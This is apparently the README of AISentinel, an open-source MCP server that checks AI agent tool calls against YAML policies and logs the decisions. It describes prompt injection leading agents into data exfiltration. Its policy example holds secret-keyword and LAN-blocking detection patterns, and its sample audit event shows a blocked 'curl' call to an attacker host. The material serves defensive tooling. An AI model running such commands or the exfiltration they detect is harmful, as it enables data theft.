# AISentinel

[![MCP Server](https://img.shields.io/badge/MCP-server-blue)](https://github.com/Kabzhanov/AISentinel)
[![GitHub release](https://img.shields.io/github/v/release/Kabzhanov/AISentinel)](https://github.com/Kabzhanov/AISentinel/releases)
[![Apache 2.0](https://img.shields.io/badge/license-Apache_2.0-green)](LICENSE)
[![Built by BizDNAi](https://img.shields.io/badge/built_by-BizDNAi-00D4FF)](https://bizdnai.com/index/)
[![Go 1.22+](https://img.shields.io/badge/go-1.22+-00ADD8)](https://go.dev/)
[![AI Trust Index](https://img.shields.io/badge/AI_Trust_Index-compatible-22c55e)](https://bizdnai.com/index/)

**The missing security, control, and observability layer for the agentic era.**

> Traditional security tools were built for malware.
> AI agents were given legitimate power through tools and APIs.
> AISentinel provides the missing security, control, and observability layer.

![AISentinel evaluating agent tool calls against the default policy — allow / block / require human approval](assets/demo.gif)

---

## 1. Project Title + Tagline

**AISentinel** — an open-source MCP server that protects AI agents at runtime.
Built by **Kabzhanov / BizDNAi**, the team behind the **AI Trust Index**.

---

## 2. Why AISentinel Exists

AI agents now have shell, browsers, file systems, and API keys. They are
**legitimate** processes — antivirus cannot see them. A single indirect
prompt injection in a PDF or email can pivot into mass data exfiltration
through ordinary tools like `Bash` and `Email_send`.

AISentinel closes that gap: it runs as an MCP server in front of every tool
call, evaluates YAML policies, logs every decision, and ships an
audit trail compatible with the [AI Trust Index](https://bizdnai.com/index/).

See [docs/SECURITY_AUDIT.md](docs/SECURITY_AUDIT.md) for the full threat model.

---

## 3. Quickstart (3 minutes)

### Option A: install the binary

```bash
go install github.com/Kabzhanov/AISentinel/cmd/aisentinel@latest
aisentinel --help
aisentinel serve
```

`go install` gives you a standalone binary — you do **not** need to clone
this repo or pass `--policy` to get started. `aisentinel serve` with no
flags loads a built-in default policy (embedded in the binary at build
time), balanced for general use: blocks obvious secrets-in-args and
destructive commands, requires approval for network calls and bulk reads.
To use your own policy instead, pass `--policy /path/to/your.yaml` or set
`$AISENTINEL_POLICY` (see [Policy resolution](#policy-resolution) below).

### Option B: install the sidecar (drop-in policy proxy for any MCP server)

```bash
go install github.com/Kabzhanov/AISentinel/cmd/aisentinel-sidecar@latest

# Wrap any stdio MCP server with one command — no --policy required:
aisentinel-sidecar ./your-mcp-server [args...]
```

### Option C: clone and build

```bash
git clone https://github.com/Kabzhanov/AISentinel.git
cd AISentinel
go build -o bin/aisentinel ./cmd/aisentinel
go build -o bin/aisentinel-sidecar ./cmd/aisentinel-sidecar
./bin/aisentinel serve --policy policies/default.yaml
```

(`--policy policies/default.yaml` here is explicit and optional — omitting
it works too, and falls back to the same built-in default described above.)

### Option D: pre-built binaries from GitHub Releases

Download from <https://github.com/Kabzhanov/AISentinel/releases/latest>.
Available for `linux/amd64`, `linux/arm64`, `darwin/amd64`, `darwin/arm64`,
`windows/amd64`.

### Option E: add to Claude Code / Cursor / Cline

```json
{
  "mcpServers": {
    "aisentinel": {
      "command": "aisentinel",
      "args": ["serve"]
    },
    "aisentinel-sidecar": {
      "command": "aisentinel-sidecar",
      "args": ["--policy", "/absolute/path/to/policies/strict.yaml", "/path/to/your-mcp-server"]
    }
  }
}
```

Then restart your MCP client and ask your agent to call any tool —
AISentinel will gate every call and write a JSONL audit trail to
`~/.aisentinel/events-YYYY-MM-DD.jsonl`.

### Policy resolution

Both `aisentinel serve` and `aisentinel-sidecar` resolve which policy to
load in this order, stopping at the first one that applies:

1. `--policy /path/to/file.yaml` — if given, it must load; a missing or
   invalid file is a hard error.
2. `$AISENTINEL_POLICY` — same contract as `--policy` if set.
3. `./policies/default.yaml` relative to the current directory, if that
   file exists (this is what you get inside a clone of this repo).
4. The **built-in default policy**, embedded in the binary at compile time.
   This is what makes `go install ... && aisentinel serve` work from any
   directory, with no repo checkout and no flags. When this path is used,
   the binary prints `using built-in default policy` to stderr so it's
   never a silent surprise.

---

## 4. Key Features

- **Pre-tool gate** — evaluate every tool call against a YAML policy
  (allow / block / require_human_approval / log_only).
- **Audit log** — append-only JSONL with a standardised event schema.
- **Validate-policy** — lint a YAML policy without loading it.
- **Built-in policies** — `default`, `strict`, `audit-only` (see `policies/`).
- **MCP-native** — works in Claude Code, Claude Desktop, Cursor, Cline, Continue.
- **Zero telemetry** — runs locally; no phone-home.
- **Apache 2.0** — permissive open source with patent grant.

---

## 5. Connectors

- **MCP stdio** — `aisentinel serve` (Claude Code, Claude Desktop, Cursor, Cline, Continue).
- **Streamable-HTTP** — `https://mcp.aisentinel.bizdnai.com/mcp` (SaaS, OAuth via BizDNAi).
- **CLI** — `aisentinel` subcommands (`serve`, `validate-policy`, `policies`, `events`, `version`).
- **Library** — Go package `github.com/Kabzhanov/AISentinel/internal/policy` for embedding.

---

## 6. Policy Examples

See [`policies/default.yaml`](policies/default.yaml) for the full default policy.

```yaml
version: 1
name: default
rules:
  - id: secret-in-args
    match: { tool_args_regex: "(?i)(api[_-]?key|secret|token|password|passwd)" }
    decision: block
    reason: "Possible secret in arguments"
  - id: lan-deny
    match: { tool_name: "Bash", tool_args_regex: "10\\.|192\\.168\\.|172\\.(1[6-9]|2\\d|3[01])\\." }
    decision: block
    reason: "LAN access blocked by default"
```

Match modes: `tool_name`, `tool_name_regex`, `tool_args_regex`, `tool_args_contains`. Multiple matchers AND-combine.

---

## 7. How it Improves AI Trust Index Score

AISentinel generates the **observability data** required for AI Trust Index
assessments:

- Every tool call → auditable event with agent_id, session_id, decision, signals.
- Every policy decision → versioned, fingerprinted (policy_signature field).
- Every block → reason, risk_signals, ready for an ATI submission.

Run `aisentinel_get_ati_snapshot` to get a JSON blob ready to paste into
the [AI Trust Index cabinet](https://bizdnai.com/index/).

---

## 8. Licensing

AISentinel is available under two licensing options:

1. **Apache License 2.0** (Open Source)
   - Free to use, modify, and distribute under the terms of the Apache 2.0 license.
   - Includes explicit patent grant from contributors.

2. **Commercial License**
   - For companies that want to embed AISentinel in closed-source products
     without open-source compliance requirements.
   - Contact: kabzhanov@gmail.com

By contributing to this repository, you agree to license your contributions
under Apache 2.0.

See [LICENSE](LICENSE) and [COMMERCIAL_LICENSE.md](COMMERCIAL_LICENSE.md).

---

## 9. Installation

Requirements: **Go 1.22+**

```bash
go install github.com/Kabzhanov/AISentinel/cmd/aisentinel@latest
```

Verify:

```bash
aisentinel version
# AISentinel v1.0.6 — by Kabzhanov / BizDNAi / AI Trust Index
#
# `go install ...@latest` builds from a tagged release and embeds that
# tag's version via -ldflags. A plain local `go build` (no -ldflags) prints
# "vdev" instead — that's expected, not a bug.
```

---

## 10. Usage Examples

### Run the MCP server

```bash
# Uses the built-in default policy — no --policy needed:
aisentinel serve

# Or point at your own policy:
aisentinel serve --policy policies/strict.yaml
```

### Validate a custom policy

```bash
aisentinel validate-policy my-policy.yaml
```

### Tail recent audit events

```bash
aisentinel events --last 20
```

### List built-in policies

```bash
aisentinel policies
```

### Try a policy without blocking (shadow mode)

```bash
AISENTINEL_DRY_RUN=1 aisentinel serve --policy policies/default.yaml
```

---

## 11. Event Schema

See [`docs/event-schema.md`](docs/event-schema.md). One JSON object per line
in the JSONL log:

```json
{
  "event_id": "20260707T221500.000000001-1",
  "timestamp": "2026-07-07T22:15:00Z",
  "event_type": "pre_tool",
  "agent_id": "agent-42",
  "session_id": "sess-abc",
  "tool_name": "Bash",
  "tool_args": { "command": "curl http://attacker.com/x" },
  "decision": "block",
  "policy_matched": ["bash-network"],
  "risk_signals": ["rule_matched:bash-network"]
}
```

---

## 12. Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). By contributing you agree to license
your contribution under Apache 2.0.

---

## 13. Roadmap

- **v1.0** (this release) — MCP stdio, 4 tools, 3 built-in policies, JSONL audit log.
- **v1.1** — `aisentinel scan` (MCP-config auditor), mobile connectors.
- **v1.2** — streamable-HTTP transport (SaaS mode), OAuth via BizDNAi.
- **v2.0** — ATI-feed integration, IDE plugins (VSCode MCP Inspector).

---

## 14. License

Apache License 2.0. See [LICENSE](LICENSE).

AISentinel is dual-licensed under Apache 2.0 and a commercial license.
For commercial terms, contact kabzhanov@gmail.com.

---

**By Kabzhanov / BizDNAi — creators of the [AI Trust Index](https://bizdnai.com/index/).**